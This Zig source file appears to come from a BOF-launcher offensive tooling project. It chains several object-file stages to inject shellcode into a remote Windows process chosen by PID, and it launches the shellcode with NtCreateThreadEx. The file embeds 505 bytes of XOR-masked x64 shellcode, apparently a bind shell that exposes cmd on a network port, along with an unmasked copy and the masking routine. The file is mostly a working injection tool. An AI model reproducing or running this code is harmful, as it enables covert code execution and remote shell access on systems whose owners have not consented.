const std = @import("std");
const assert = std.debug.assert;
const bof = @import("bof_launcher_api");
const w32 = @import("bof_launcher_win32");
const shared = @import("shared");

pub const std_options = std.Options{
    .log_level = .info,
};

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    var cmd_args_iter = try std.process.argsWithAllocator(allocator);
    defer cmd_args_iter.deinit();

    _ = cmd_args_iter.next() orelse unreachable;
    const pid_str = cmd_args_iter.next() orelse {
        try usage();
        return;
    };
    const pid = try std.fmt.parseInt(u32, pid_str, 10);

    try bof.initLauncher();
    defer bof.releaseLauncher();

    const bof_clone_process = blk: {
        const coff = try loadBofFromFile(allocator, "wCloneProcess");
        defer allocator.free(coff);
        break :blk try bof.Object.initFromMemory(coff);
    };
    defer bof_clone_process.release();

    const bof_stage0 = blk: {
        const coff = try loadBofFromFile(allocator, "wInjectionChainStage0");
        defer allocator.free(coff);
        break :blk try bof.Object.initFromMemory(coff);
    };
    defer bof_stage0.release();

    const bof_stage1 = blk: {
        const coff = try loadBofFromFile(allocator, "wInjectionChainStage1");
        defer allocator.free(coff);
        break :blk try bof.Object.initFromMemory(coff);
    };
    defer bof_stage1.release();

    const bof_stage2 = blk: {
        const coff = try loadBofFromFile(allocator, "wInjectionChainStage2C");
        defer allocator.free(coff);
        break :blk try bof.Object.initFromMemory(coff);
    };
    defer bof_stage2.release();

    const bof_stage3 = blk: {
        const coff = try loadBofFromFile(allocator, "wInjectionChainStage3");
        defer allocator.free(coff);
        break :blk try bof.Object.initFromMemory(coff);
    };
    defer bof_stage3.release();

    const state = try allocator.create(shared.State);
    defer allocator.destroy(state);

    var shellcode_buf: [masked_shellcode.len]u8 = undefined;
    @memcpy(&shellcode_buf, &masked_shellcode);
    for (0..shellcode_buf.len) |i| {
        shellcode_buf[i] ^= 0x55;
    }
    const shellcode = shellcode_buf[0..];

    state.* = .{
        .process_id = pid,
        .shellcode = shellcode.ptr,
        .shellcode_len = shellcode.len,
    };

    const args = try bof.Args.init();
    defer args.release();
    args.begin();
    try args.add(std.mem.asBytes(&@intFromPtr(state)));
    args.end();

    const ctx_stage0 = try bof_stage0.run(args.getBuffer());
    defer ctx_stage0.release();
    std.debug.print("nt status: {d}\n", .{state.nt_status});
    if (state.nt_status != .SUCCESS) return;

    {
        const ctx = try bof_clone_process.run(null);
        defer ctx.release();
        if (ctx.getExitCode() == 0) return;
    }

    const ctx_stage1 = try bof_stage1.run(args.getBuffer());
    defer ctx_stage1.release();
    std.debug.print("nt status: {d}\n", .{state.nt_status});
    if (state.nt_status != .SUCCESS) return;

    {
        const ctx = try bof_clone_process.run(null);
        defer ctx.release();
        if (ctx.getExitCode() == 0) return;
    }

    const ctx_stage2 = try bof_stage2.run(args.getBuffer());
    defer ctx_stage2.release();
    std.debug.print("nt status: {d}\n", .{state.nt_status});
    if (state.nt_status != .SUCCESS) return;

    {
        const ctx = try bof_clone_process.run(null);
        defer ctx.release();
        if (ctx.getExitCode() == 0) return;
    }

    const ctx_stage3 = try bof_stage3.run(args.getBuffer());
    defer ctx_stage3.release();
    std.debug.print("nt status: {d}\n", .{state.nt_status});
    if (state.nt_status != .SUCCESS) return;

    {
        const ctx = try bof_clone_process.run(null);
        defer ctx.release();
        if (ctx.getExitCode() == 0) return;
    }

    var thread_handle: w32.HANDLE = undefined;
    state.nt_status = w32.NtCreateThreadEx.?(
        &thread_handle,
        0x1fffff,
        null,
        state.process_handle,
        @ptrFromInt(state.base_address),
        null,
        0,
        0,
        0,
        0,
        null,
    );

    std.debug.print("nt status: {d}\n", .{state.nt_status});

    _ = w32.NtClose.?(thread_handle);
}

fn loadBofFromFile(allocator: std.mem.Allocator, bof_name: [:0]const u8) ![]const u8 {
    const pathname = try std.mem.join(allocator, ".", &.{
        bof_name,
        if (@import("builtin").os.tag == .windows) "coff" else "elf",
        switch (@import("builtin").cpu.arch) {
            .x86_64 => "x64",
            .x86 => "x86",
            .aarch64 => "aarch64",
            .arm => "arm",
            else => unreachable,
        },
        "o",
    });
    defer allocator.free(pathname);

    var bof_path: [std.fs.max_path_bytes:0]u8 = undefined;
    const absolute_bof_path = try std.fs.cwd().realpath(pathname, bof_path[0..]);
    bof_path[absolute_bof_path.len] = 0;

    const file = try std.fs.openFileAbsoluteZ(&bof_path, .{});
    defer file.close();

    return try file.reader().readAllAlloc(allocator, 16 * 1024 * 1024);
}

fn usage() !void {
    const stdout = std.io.getStdOut().writer();
    try stdout.print(
        \\
        \\ USAGE:
        \\      process_injection_chain <PID>
        \\ ARGS:
        \\      <PID>       Remote process ID.
        \\ 
    , .{});
}

const masked_shellcode = [505]u8{
    169, 29,  214, 177, 165, 189, 149, 85,  85,  85,  20,  4,   20,  5,   7,   4,
    3,   29,  100, 135, 48,  29,  222, 7,   53,  29,  222, 7,   77,  29,  222, 7,
    117, 29,  222, 39,  5,   29,  90,  226, 31,  31,  24,  100, 156, 29,  100, 149,
    249, 105, 52,  41,  87,  121, 117, 20,  148, 156, 88,  20,  84,  148, 183, 184,
    7,   20,  4,   29,  222, 7,   117, 222, 23,  105, 29,  84,  133, 222, 213, 221,
    85,  85,  85,  29,  208, 149, 33,  50,  29,  84,  133, 5,   222, 29,  77,  17,
    222, 21,  117, 28,  84,  133, 182, 3,   29,  170, 156, 20,  222, 97,  221, 29,
    84,  131, 24,  100, 156, 29,  100, 149, 249, 20,  148, 156, 88,  20,  84,  148,
    109, 181, 32,  164, 25,  86,  25,  113, 93,  16,  108, 132, 32,  141, 13,  17,
    222, 21,  113, 28,  84,  133, 51,  20,  222, 89,  29,  17,  222, 21,  73,  28,
    84,  133, 20,  222, 81,  221, 29,  84,  133, 20,  13,  20,  13,  11,  12,  15,
    20,  13,  20,  12,  20,  15,  29,  214, 185, 117, 20,  7,   170, 181, 13,  20,
    12,  15,  29,  222, 71,  188, 2,   170, 170, 170, 8,   28,  235, 34,  38,  103,
    10,  102, 103, 85,  85,  20,  3,   28,  220, 179, 29,  212, 185, 245, 84,  85,
    85,  28,  220, 176, 28,  233, 87,  85,  88,  80,  85,  85,  85,  85,  20,  1,
    28,  220, 177, 25,  220, 164, 20,  239, 25,  34,  115, 82,  170, 128, 25,  220,
    191, 61,  84,  84,  85,  85,  12,  20,  239, 124, 213, 62,  85,  170, 128, 5,
    5,   24,  100, 156, 24,  100, 149, 29,  170, 149, 29,  220, 151, 29,  170, 149,
    29,  220, 148, 20,  239, 191, 90,  138, 181, 170, 128, 29,  220, 146, 63,  69,
    20,  13,  25,  220, 183, 29,  220, 172, 20,  239, 151, 142, 98,  50,  170, 128,
    29,  100, 135, 29,  220, 172, 20,  239, 226, 188, 109, 170, 170, 128, 24,  100,
    149, 29,  100, 135, 29,  220, 172, 20,  239, 33,  185, 110, 180, 170, 128, 29,
    220, 172, 29,  220, 146, 20,  239, 32,  59,  24,  52,  170, 128, 29,  212, 145,
    245, 87,  85,  85,  28,  237, 54,  56,  49,  85,  85,  85,  85,  85,  20,  5,
    20,  5,   29,  220, 183, 2,   2,   2,   24,  100, 149, 63,  88,  12,  20,  5,
    183, 169, 51,  146, 17,  113, 1,   84,  84,  29,  216, 17,  113, 77,  147, 85,
    61,  29,  220, 179, 3,   5,   20,  5,   20,  5,   20,  5,   28,  170, 149, 20,
    5,   28,  170, 157, 24,  220, 148, 25,  220, 148, 20,  239, 44,  153, 106, 211,
    170, 128, 29,  100, 135, 29,  170, 159, 222, 91,  20,  239, 93,  210, 72,  53,
    170, 128, 238, 165, 224, 247, 3,   20,  239, 243, 192, 232, 200, 170, 128, 29,
    214, 145, 125, 105, 83,  41,  95,  213, 174, 181, 32,  80,  238, 18,  70,  39,
    58,  63,  85,  12,  20,  220, 143, 170, 128,
};

const gen_masked_shellcode = init: {
    var buf: [505]u8 = undefined;
    @memcpy(&buf, "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x0d\x05\x00\x00\x00\x00\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\xc2\xdb\x37\x67\xff\xd5\x48\x31\xd2\x48\x89\xf9\x41\xba\xb7\xe9\x38\xff\xff\xd5\x4d\x31\xc0\x48\x31\xd2\x48\x89\xf9\x41\xba\x74\xec\x3b\xe1\xff\xd5\x48\x89\xf9\x48\x89\xc7\x41\xba\x75\x6e\x4d\x61\xff\xd5\x48\x81\xc4\xa0\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5");
    for (buf[0..], 0..) |_, i| {
        buf[i] ^= 0x55;
    }
    @compileLog(std.fmt.comptimePrint("{d}", .{buf[0..]}));
    const final = buf;
    break :init &final;
};

comptime {
    //_ = gen_masked_shellcode;
}
